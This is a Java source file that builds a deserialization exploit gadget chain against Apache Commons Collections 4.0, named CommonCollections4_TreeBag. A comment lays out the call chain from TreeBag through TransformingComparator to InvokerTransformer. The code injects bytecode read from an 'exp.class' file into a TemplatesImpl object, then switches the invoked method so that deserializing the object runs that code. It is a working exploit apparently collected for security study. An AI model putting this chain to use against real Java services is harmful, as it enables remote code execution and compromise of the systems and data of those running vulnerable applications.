import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import sun.misc.BASE64Decoder;

import javax.xml.bind.DatatypeConverter;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.AbstractMap;
import java.util.TreeMap;

import static util.Util.serialize;
import static util.Util.unserialize;
/*org.apache.commons.collections4.bag.TreeBag.readObject()
    org.apache.commons.collections4.bag.AbstractMapBag.doReadObject()
        java.util.TreeMap.put()
            java.util.TreeMap.compare()
                org.apache.commons.collections4.comparators.TransformingComparator.compare()
                        org.apache.commons.collections4.functors.InvokerTransformer.transform()
                        */
/*版本依赖:
* commons-collections4 : 4.0
* */

public class CommonCollections4_TreeBag {



    public static void main(String[] args) throws Exception {
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());


        Transformer transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(transformer);
        TreeBag treeBag=new TreeBag(transformingComparator);
        treeBag.add(templates);
        Field field = InvokerTransformer.class.getDeclaredField("iMethodName");
        field.setAccessible(true);
        field.set(transformer, "newTransformer");
        serialize(treeBag);
        unserialize();
    }

}
